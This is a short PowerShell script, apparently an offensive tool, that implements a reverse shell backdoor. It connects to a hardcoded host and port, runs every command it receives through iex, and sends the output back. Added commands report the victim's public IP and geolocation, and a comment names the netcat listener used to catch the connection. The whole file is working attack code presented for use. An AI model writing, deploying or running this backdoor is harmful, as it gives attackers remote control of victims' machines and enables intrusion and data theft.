#!/usr/bin/pwsh
#Created By Unamed
# Listener : nc -lvp <$LPORT>

function ReverseShell {
    param([String]$LHOST,[int]$LPORT)
    $client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)

        #strcmp()
        if ($data.startswith("/shell_help")){
            $message = "ipgeo    | Get Geolocation"
            $sendbyte = ([text.encoding]::ASCII).GetBytes($message)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        elseif($data.startswith("exit")){
            $message = "Exit Backdoor !!!"
            $sendbyte = ([text.encoding]::ASCII).GetBytes($message)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
            break;
        }
        elseif($data.startswith("ipgeo")){
            $r = Invoke-WebRequest -URI "https://ipinfo.io/json"
            $status = $r.StatusCode
            if($status -eq 200){
                $data_ipgeo = $r.Content
                $sendbyte = ([text.encoding]::ASCII).GetBytes($data_ipgeo)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
                $sendback = (iex $data 2>&1 | Out-String )
                $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
            }
        }

        elseif($data.startswith("getip")){
            $r = Invoke-WebRequest -URI "https://ifconfig.me/ip"
            $status = $r.StatusCode
            if($status -eq 200){
                $target_ip = $r.Content
                $sendbyte = ([text.encoding]::ASCII).GetBytes($target_ip)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
                $sendback = (iex $data 2>&1 | Out-String )
                $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
            }
        }

        elseif($data.startswith("quit")){
            $message = "Exit Backdoor !!!"
            $sendbyte = ([text.encoding]::ASCII).GetBytes($message)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
            break;
        }
        else{
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
    }
    $client.Close()
}


$LHOST = "192.168.1.71"
$LPORT = 666
ReverseShell -LHOST $LHOST -LPORT $LPORT